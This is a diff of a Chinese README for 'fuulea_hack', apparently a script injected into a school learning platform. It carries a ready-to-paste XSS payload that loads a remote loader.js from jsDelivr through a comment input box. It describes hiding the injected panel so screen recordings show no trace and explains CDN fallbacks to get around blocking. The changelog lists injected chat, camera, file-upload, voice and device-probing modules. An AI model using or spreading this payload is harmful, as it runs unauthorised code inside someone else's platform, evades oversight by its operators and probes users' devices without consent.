@@ -7,7 +7,7 @@
 贴进「注释填空」的输入框，随便答错提交：
 
 ```html
-<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.9/loader.js'">
+<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.10/loader.js'">
 ```
 
 154 字符，输入框没有长度限制，直接粘贴即可。面板出现在右下角。**再注入一次就是隐形开关**：面板开着时注入 → 整块隐藏；再注入 → 显形。藏起来时页面里只剩你原本的内容，录屏、投屏都不留痕迹。
@@ -27,6 +27,15 @@
 > 为什么不用 GitLab `/-/raw/`：它返回 `text/plain` + `nosniff`，`<script>` 标签拒执行。jsDelivr 走 GitHub 并给正确的 JS MIME，所以当主源。
 >
 > `cdn.jsdelivr.net` 在国内常被重置，所以注入串默认用 `fastly.jsdelivr.net`；loader 自身与模块加载会按 `cdn` → `fastly` → `gcore` → raw.githubusercontent → GitLab API 依次重试。
+
+## v3.10
+
+- **AI 对话网页新增语音输入**：输入行（📷 与文本框之间）新增 🎤 按钮，用 Web Speech API 语音识别转文字填入输入框，识别结果不自动发送，你确认后再手动发送；再点一次 🎤 或说完自动停止。浏览器不支持语音识别（非 https / 无 `SpeechRecognition`）时按钮自动隐藏。
+- **聊天室新增语音输入**：同样的 🎤 按钮，识别结果填入输入框；浏览器不支持时按钮隐藏。
+- **聊天室支持发图片 / 视频 / 文件**：输入行新增 📎 按钮，可一次多选文件（图片 / 视频 / 任意文件），逐张上传到 `media/<用户名>/` 后随消息发送。接收端**不自动下载**，显示「该文件为图片 / 视频 / 文件，点击可下载查看」，点一下才拉取：图片全屏缩放查看、视频弹窗播放、其他文件触发下载。
+- **聊天室支持发语音消息**：输入行新增 🎙️ 录音按钮（MediaRecorder 录 webm），点开始 / 再点停止，上传后发送，消息上标时长。接收端同样不自动下载，显示「该文件为语音消息，点击可下载查看」；下载后**不自动播放**，出现 ▶ 播放条，点 ▶ 才播放；每条语音下方还有「转文字」选项，点了就显示发送端用语音识别预生成的文字（发送端浏览器不支持识别时会注明）。
+- **拍照 / 录像更清晰**：不调用系统相机 App，仍用网页 `getUserMedia`，但 AI 拍照优先用 `ImageCapture.takePhoto()` 取摄像头原生最大静态像素（拿不到再回退 canvas 截图），并把取流分辨率提到 4K（理想值 4096×2160）；录像比特率提到 12 Mbps。摄像头不支持高清时浏览器自动降级。
+- 版本号 `TAG` / AI 头栏 / 聊天室徽标 / 主面板标签统一升到 3.10。
 
 ## v3.9
 
@@ -129,8 +138,8 @@
 
 | 按钮 | 文件 | 作用 |
 |---|---|---|
-| 🤖 AI 网页 | `mods/ai.js` | 全屏、密钥掩码、网页相机拍照 / 相册、多会话、Chat/Responses、模型扫描、探测缓存；多图输入（≤9 张）+ 图片缩放 |
-| 💬 聊天室（共享） | `mods/room.js` | 独立窗口（不打开 AI），消息写 GitLab `message/`，30 秒轮询 + 本机缓存；拖动 / 缩放 / 全屏 |
+| 🤖 AI 网页 | `mods/ai.js` | 全屏、密钥掩码、网页相机拍照 / 相册、多会话、Chat/Responses、模型扫描、探测缓存；多图输入（≤9 张）+ 图片缩放；🎤 语音输入（识别转文字） |
+| 💬 聊天室（共享） | `mods/room.js` | 独立窗口（不打开 AI），消息写 GitLab `message/`，30 秒轮询 + 本机缓存；拖动 / 缩放 / 全屏；发图片 / 视频 / 文件（点击才下载查看）、🎙️ 录音语音消息（点击播放 + 转文字）、🎤 语音输入 |
 | 👤 账号 | `loader.js` | 用户名 + PIN 登录（本机持久）；AI Key / Token / 网页配置按账号保存 |
 | ⬆ 上传配置 | `loader.js` | 本机 `fh:*` 配置加密上传到私有仓库 `yq-group2/fuulea_ai_repository` 的 `config/<id>.json`（除 API Key / 会话 / 缓存 / 用量）；PIN 自动生成并保存在本机 |
 | ⬇ 更新配置 | `loader.js` | 本机有 PIN 时静默恢复，换设备先输入读权限 Token 再输 PIN |
@@ -143,7 +152,7 @@
 | 🧹 清答案 | `mods/clean.js` | 删错题本里存的答题原文 `yourAns` |
 | 🖼 图片 | `mods/img.js` | 直链图片全屏弹窗 |
 | 🌐 网页 | `mods/embed.js` | 网址 iframe 弹窗；真栈返回：← 回上一个网页 / 列表（受对方 X-Frame-Options 限制） |
-| 📷 相机 / 📂 文件 | `mods/media.js` | 网页相机拍照录像（完整比例、圆形快门）/ 本地媒体查看；有 Token 时可 ⬆ 上传到 GitLab `media/<用户名>/` |
+| 📷 相机 / 📂 文件 | `mods/media.js` | 网页相机拍照录像（4K 取流 + 12 Mbps 录像、完整比例、圆形快门）/ 本地媒体查看；有 Token 时可 ⬆ 上传到 GitLab `media/<用户名>/` |
 | 🧭 探测 | `mods/probe.js` | 权限状态、摄像头 / 麦克风 / 定位 / 屏幕共享、文件 / 剪贴板 / 分享、传感器 / 电池 / 网络、蓝牙 / USB / 串口 / HID / MIDI / NFC、外部 App URI Scheme |
 | 📦 存档 | `mods/dump.js` | 展示并复制完整 `state` JSON |
 | 💣 清空 | `mods/reset.js` | 清 `wycg_v3` + `wycg_rank_v1` |
